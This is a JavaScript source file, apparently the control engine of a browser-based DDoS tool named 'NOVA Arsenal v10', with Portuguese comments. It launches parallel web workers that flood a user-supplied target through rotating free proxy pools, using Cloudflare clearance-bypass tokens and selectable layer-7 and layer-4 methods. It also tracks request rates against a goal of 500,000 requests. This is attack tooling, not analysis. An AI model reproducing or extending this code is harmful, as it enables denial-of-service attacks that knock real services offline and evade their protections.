// NOVA Arsenal v10 — Engine Principal
// Orquestra workers, proxies, e métricas em tempo real

class NovaEngine {
  constructor() {
    this.workers = [];
    this.proxies = [];
    this.cfTokens = null;
    this.active = false;
    this.stats = { sent: 0, failed: 0, startTime: 0 };
    this.target = '';
    this.timerInterval = null;
    this.statsInterval = null;
    this.WORKER_COUNT = 8; // Número de workers = threads paralelas
  }

  log(msg, type = 'info') {
    const t = document.getElementById('terminal');
    const line = document.createElement('div');
    line.className = 'terminal-line';
    const time = new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const colors = { info: 'term-info', warn: 'term-warn', err: 'term-err', ok: 'term-ok' };
    line.innerHTML = `<span class="term-time">${time}</span><span class="${colors[type] || 'term-info'}">${msg}</span>`;
    t.appendChild(line);
    t.scrollTop = t.scrollHeight;
  }

  async loadProxies() {
    this.log('Carregando pools de proxy...', 'info');
    try {
      const r = await fetch('/.netlify/edge/proxy-rotate');
      const d = await r.json();
      this.proxies = d.proxies || [];
      
      document.getElementById('dot-ps').className = 'proxy-dot' + (d.fingerprints?.proxyscrape?.status === 'fulfilled' ? ' online' : '');
      document.getElementById('dot-gn').className = 'proxy-dot' + (d.fingerprints?.geonode?.status === 'fulfilled' ? ' online' : '');
      document.getElementById('dot-pf').className = 'proxy-dot' + (d.fingerprints?.proxifly?.status === 'fulfilled' ? ' online' : '');
      
      document.getElementById('label-ps').textContent = `ProxyScrape (${d.fingerprints?.proxyscrape?.count || 0})`;
      document.getElementById('label-gn').textContent = `GeoNode (${d.fingerprints?.geonode?.count || 0})`;
      document.getElementById('label-pf').textContent = `Proxifly (${d.fingerprints?.proxifly?.count || 0})`;
      
      this.log(`${this.proxies.length} proxies carregados`, 'ok');
      return this.proxies.length > 0;
    } catch (e) {
      this.log(`Erro ao carregar proxies: ${e.message}`, 'err');
      return false;
    }
  }

  async loadCFTokens() {
    try {
      const r = await fetch('/.netlify/edge/cf-bypass');
      this.cfTokens = await r.json();
      this.log('Tokens CF carregados', 'ok');
    } catch (e) {
      this.log('Falha ao carregar tokens CF, usando fallback', 'warn');
      this.cfTokens = { tokens: { cf_clearance: 'fallback' } };
    }
  }

  getActiveMethods() {
    const l7 = [...document.querySelectorAll('#l7-grid .method-chip.active')].map(el => el.dataset.m);
    const l4 = [...document.querySelectorAll('#l4-grid .method-chip.active')].map(el => el.dataset.m);
    return { l7, l4 };
  }

  async deploy() {
    if (this.active) return;
    
    this.target = document.getElementById('target').value.trim();
    if (!this.target) { this.log('Informe um alvo válido', 'err'); return; }
    
    const intensity = document.getElementById('intensity').value;
    const threadsMap = { low: 10, medium: 50, high: 100, maximum: 200 };
    const threadsPerWorker = threadsMap[intensity] || 50;
    
    document.getElementById('btn-deploy').disabled = true;
    document.getElementById('btn-stop').disabled = false;
    
    this.log(`Iniciando reconhecimento: ${this.target}`, 'warn');
    
    const hasProxies = await this.loadProxies();
    if (!hasProxies) {
      this.log('Sem proxies disponíveis. Abortando.', 'err');
      document.getElementById('btn-deploy').disabled = false;
      document.getElementById('btn-stop').disabled = true;
      return;
    }
    
    await this.loadCFTokens();
    
    const methods = this.getActiveMethods();
    const allMethods = [...methods.l7, ...methods.l4];
    if (allMethods.length === 0) { this.log('Selecione pelo menos um método', 'warn'); return; }
    
    this.log(`Deployando ${this.WORKER_COUNT} workers × ${threadsPerWorker} threads`, 'warn');
    this.log(`Métodos: ${allMethods.join(', ')}`, 'info');
    
    this.active = true;
    this.stats = { sent: 0, failed: 0, startTime: Date.now() };
    this.workers = [];
    
    // Cria workers e inicia
    for (let i = 0; i < this.WORKER_COUNT; i++) {
      const w = new Worker('workers/storm-worker.js');
      w.postMessage({
        cmd: 'init',
        config: { proxies: this.proxies, target: this.target, cfTokens: this.cfTokens }
      });
      
      w.onmessage = (e) => {
        if (e.data.type === 'stats') {
          this.stats.sent += e.data.sent || 0;
          this.stats.failed += e.data.failed || 0;
        }
      };
      
      this.workers.push(w);
    }
    
    // Aguarda init e inicia ataque
    await new Promise(r => setTimeout(r, 500));
    
    for (const w of this.workers) {
      w.postMessage({
        cmd: 'start',
        config: { methods: allMethods, threads: threadsPerWorker }
      });
    }
    
    this.log('STORM INICIADO — TODOS OS SISTEMAS ATIVOS', 'ok');
    
    // Timer
    this.timerInterval = setInterval(() => {
      const elapsed = Math.floor((Date.now() - this.stats.startTime) / 1000);
      const m = Math.floor(elapsed / 60).toString().padStart(2, '0');
      const s = (elapsed % 60).toString().padStart(2, '0');
      document.getElementById('timer').textContent = `${m}:${s}`;
    }, 1000);
    
    // Stats updater
    this.statsInterval = setInterval(() => this.updateUI(), 200);
  }

  updateUI() {
    const elapsed = (Date.now() - this.stats.startTime) / 1000;
    const rate = elapsed > 0 ? Math.floor(this.stats.sent / elapsed) : 0;
    
    // Counter com animação
    const counter = document.getElementById('counter');
    const oldVal = parseInt(counter.textContent.replace(/,/g, '')) || 0;
    if (this.stats.sent !== oldVal) {
      counter.textContent = this.stats.sent.toLocaleString();
      counter.classList.add('pulse');
      setTimeout(() => counter.classList.remove('pulse'), 100);
    }
    
    // Progress ring (meta: 500k em 70s)
    const target = 500000;
    const pct = Math.min((this.stats.sent / target) * 100, 100);
    const circumference = 2 * Math.PI * 90;
    const offset = circumference - (pct / 100) * circumference;
    document.getElementById('progress').style.strokeDashoffset = offset;
    document.getElementById('pct').textContent = Math.floor(pct) + '%';
    
    document.getElementById('rate').textContent = rate.toLocaleString() + '/s';
    document.getElementById('fails').textContent = this.stats.failed.toLocaleString();
    document.getElementById('workers').textContent = this.workers.length;
  }

  stop() {
    if (!this.active) return;
    this.active = false;
    
    for (const w of this.workers) {
      w.postMessage({ cmd: 'stop' });
    }
    
    clearInterval(this.timerInterval);
    clearInterval(this.statsInterval);
    
    this.log(`Storm finalizado. Total: ${this.stats.sent.toLocaleString()} requests`, 'ok');
    
    document.getElementById('btn-deploy').disabled = false;
    document.getElementById('btn-stop').disabled = true;
  }
}

// Toggle method chips
document.querySelectorAll('.method-chip').forEach(chip => {
  chip.addEventListener('click', () => {
    chip.classList.toggle('active');
  });
});

// Generate particles
const particles = document.getElementById('particles');
for (let i = 0; i < 30; i++) {
  const p = document.createElement('div');
  p.className = 'particle';
  p.style.left = Math.random() * 100 + '%';
  p.style.animationDelay = Math.random() * 15 + 's';
  p.style.animationDuration = (10 + Math.random() * 10) + 's';
  particles.appendChild(p);
}

const nova = new NovaEngine();

function deploy() { nova.deploy(); }
function stop() { nova.stop(); }
